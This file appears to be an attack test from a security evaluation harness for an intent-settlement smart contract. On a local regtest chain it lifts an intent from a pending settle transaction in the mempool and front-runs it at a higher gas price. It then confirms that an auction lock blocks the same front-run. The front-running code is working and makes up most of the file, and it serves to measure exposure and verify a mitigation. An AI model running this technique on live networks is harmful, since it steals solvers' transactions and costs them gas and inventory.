/**
 * M1 — LIFT THE INTENT OUT OF A PENDING SETTLE AND FRONT-RUN IT.
 *
 * An intent is self-authenticating, which is exactly what lets anyone relay it — and equally what
 * lets anyone who SEES it settle it. A solver's settle carries `rawIntentTx` in its calldata, in the
 * clear, in the public mempool. Any observer can decode those bytes and submit their own settle for
 * the same intent.
 *
 * Whoever lands first consumes H; the loser reverts. So this is a pure ordering contest, and a MINER
 * wins it by construction because it decides what its block contains. A non-mining attacker gets the
 * same effect for a price: outbid the victim on gas. That is what this attack does, because it is
 * observable on the default stack — the miner's version is the same attack with the fee set to zero.
 *
 * What it costs the victim is not just gas. For a compound intent the solver has already ACQUIRED the
 * output (minted, swapped, LP'd, vaulted) before it can settle; a front-run leaves it holding that
 * inventory with the intent gone. That is the number that decides whether solving is a business.
 *
 * The design's own mitigation is the auction lock (D1): once an intent is bid upon, only the auction
 * may settle it, so the front-run has to become a bid — which pays the user instead of the attacker.
 * This attack therefore runs twice: bid-free (expected to succeed) and auction-locked (expected to be
 * refused), so the board records both the exposure and the thing that closes it.
 *
 * Procedure: victim broadcasts a settle -> attacker reads txpool_content, decodes rawIntentTx from the
 *            calldata, and submits its own settle at a higher gasPrice -> observe who consumed H and
 *            what the victim was left holding. Then repeat against an auction-locked intent.
 * Falsifier: the front-run cannot extract the intent from the calldata, loses despite paying more, or
 *            succeeds even against an open auction (which would break D1's guarantee).
 */
import { Interface, JsonRpcProvider, Network, Wallet, getBytes, hexlify, randomBytes } from "ethers";
import { buildIntent, freshWallet, isConsumed, randomH } from "../src/intent.js";
import { depositForPegin, peginOf } from "../src/settlement.js";
import { auction, placeBid, bidOf } from "../src/auction.js";
import { CHAIN_ID, COW_KEY, SETTLEMENT_ADDR } from "../src/config.js";
import { fundAccount, preflight, requireSettlement, rpcA, waitReceipt } from "../experiments/_harness.js";
import settlementAbi from "../src/abi/Settlement.json" with { type: "json" };
import { Attack } from "./_forensics.js";
import { AttackSpec, Outcome } from "./registry.js";

const INPUT = 10_000_000_000_000_000n;
const MINOUT = 1_000_000_000_000_000n;
const BID = MINOUT + 300_000_000_000_000n;
const GAS_MONEY = 60_000_000_000_000_000n;
const VICTIM_GAS_PRICE = 1_000_000n;      // what every SDK caller sends
const ATTACK_GAS_PRICE = 50_000_000n;     // 50x — a miner pays nothing for the same effect

export async function run(spec: AttackSpec): Promise<number> {
  await preflight(rpcA);
  await requireSettlement(rpcA);
  const a = new Attack(spec, rpcA);
  const iface = new Interface(settlementAbi as import("ethers").InterfaceAbi);
  const provider = new JsonRpcProvider(rpcA.url, new Network("rsk-regtest", CHAIN_ID), { staticNetwork: true });

  const victimKey = Wallet.createRandom().privateKey;
  const attackerKey = Wallet.createRandom().privateKey;
  const victim = new Wallet(victimKey, provider);
  const attacker = new Wallet(attackerKey, provider);
  await waitReceipt(rpcA, await fundAccount(victim.address, GAS_MONEY));
  await waitReceipt(rpcA, await fundAccount(attacker.address, GAS_MONEY));
  a.watch("victim solver", victim.address);
  a.watch("attacker", attacker.address);

  /** a funded RBTC-output intent, escrow bound */
  async function funded() {
    const btcTxid = getBytes(randomBytes(32));
    const H = randomH();
    const user = freshWallet();
    await waitReceipt(rpcA, await depositForPegin(rpcA.url, hexlify(btcTxid), INPUT, hexlify(H)));
    const intent = buildIntent(user, { H, btcTxid, expiry: (await rpcA.blockNumber()) + 90, minOut: MINOUT });
    await rpcA.sendRaw(intent.rawHex);
    return { H, btcTxid, user, intent };
  }

  /** send a settle without waiting, so both can be in flight at once */
  const sendSettle = (w: Wallet, raw: string, gasPrice: bigint) =>
    w.sendTransaction({
      to: SETTLEMENT_ADDR, data: iface.encodeFunctionData("settle", [raw]),
      value: MINOUT, gasLimit: 1_500_000, gasPrice, type: 0, chainId: CHAIN_ID,
    });

  // ---- round 1: a bid-free intent, no exclusivity ------------------------------------------
  // all watches before the first mark(): the harness throws on a late watch, since a missing
  // baseline reads as a zero delta and would score as "the attacker gained nothing".
  a.step("stage both intents and register every party before taking the baseline");
  const p1 = await funded();
  const p2 = await funded();
  a.watch("user 1", p1.user.address);
  a.watch("user 2", p2.user.address);
  await a.mark();

  a.step("victim solver broadcasts a settle for a bid-free intent");
  const victimTx = await sendSettle(victim, p1.intent.rawHex, VICTIM_GAS_PRICE);
  a.check("victim's settle is in flight", !!victimTx.hash, victimTx.hash.slice(0, 16) + "…");

  a.step("attacker reads the mempool and recovers the intent from the pending calldata");
  const pending = await rpcA.pendingTxs();
  const seen = pending.find((t) => t.hash.toLowerCase() === victimTx.hash.toLowerCase());
  a.check("the victim's settle is visible in txpool_content", !!seen, seen ? "found" : "not found (already mined?)");
  let lifted: string | null = null;
  if (seen?.input) {
    try {
      const [raw] = iface.decodeFunctionData("settle", seen.input);
      lifted = raw as string;
    } catch { /* not a settle, or truncated */ }
  }
  a.check("rawIntentTx decoded straight out of the victim's calldata",
    lifted !== null && lifted.toLowerCase() === p1.intent.rawHex.toLowerCase(),
    lifted ? `${lifted.length / 2 - 1} bytes, byte-identical` : "could not decode");

  a.step("attacker submits ITS OWN settle for the same intent, at 50x the gas price");
  const raced = lifted ?? p1.intent.rawHex;
  const attackTx = await sendSettle(attacker, raced, ATTACK_GAS_PRICE);
  const attackRes = await a.tx(attackTx.hash);
  const victimRes = await a.tx(victimTx.hash);
  a.check("attacker's settle SUCCEEDED", attackRes.ok, attackRes.reason ?? "");
  a.check("victim's settle REVERTED on the consumed H", !victimRes.ok, victimRes.reason ?? "no reason");
  a.check("H consumed exactly once", await isConsumed((to, d) => rpcA.ethCall(to, d), p1.H));
  a.check("escrow went to the attacker's settle", (await peginOf(rpcA.url, hexlify(p1.btcTxid))) === 0n);
  const d1 = await a.deltas();
  a.check("the user was still paid minOut — the harm is to the solver, not the user",
    (d1.get("user 1") ?? 0n) === MINOUT, `${d1.get("user 1")}`);
  a.check("the victim paid gas for nothing", (d1.get("victim solver") ?? 0n) < 0n, `${d1.get("victim solver")} wei`);
  a.note("a miner needs no gas premium at all: it simply orders its own settle first in its own block");
  a.note("for a COMPOUND intent the victim would also be left holding the output it pre-acquired");

  // ---- round 2: the same attack against an auction-locked intent ----------------------------
  a.step("now the design's mitigation: bid on an intent first, so the auction owns it");
  const a1 = auction(rpcA.url, COW_KEY);
  const bid = await a.tx(placeBid(a1, p2.intent.rawHex, BID));
  a.check("a bid opened the auction and engaged the lock", bid.ok, bid.reason ?? "");
  const b = await bidOf(a1, p2.H);
  a.check("lock is live", b.deadline > 0n, `until block ${b.deadline}`);

  a.step("attacker front-runs the auction-locked intent with a direct settle");
  const poach = await a.tx((await sendSettle(attacker, p2.intent.rawHex, ATTACK_GAS_PRICE)).hash);
  a.check("front-run REFUSED while the auction holds the intent", !poach.ok, poach.reason ?? "no reason");
  a.check("refused because the auction owns it", (poach.reason ?? "").includes("auction owns this intent"),
    poach.reason ?? "");
  a.check("H untouched", !(await isConsumed((to, d) => rpcA.ethCall(to, d), p2.H)));
  a.check("escrow untouched", (await peginOf(rpcA.url, hexlify(p2.btcTxid))) === INPUT);
  await a.deltas();

  a.note("so the exposure is real for bid-free intents and closed for bid-upon ones: the auction lock");
  a.note("turns a front-run into a bid, which pays the USER the surplus instead of the front-runner.");
  a.note("An always-on seed bid (the playground's broker) is the practical mitigation this implies.");

  const observed: Outcome = attackRes.ok ? "succeeds" : "blocked";
  return a.finish(observed);
}
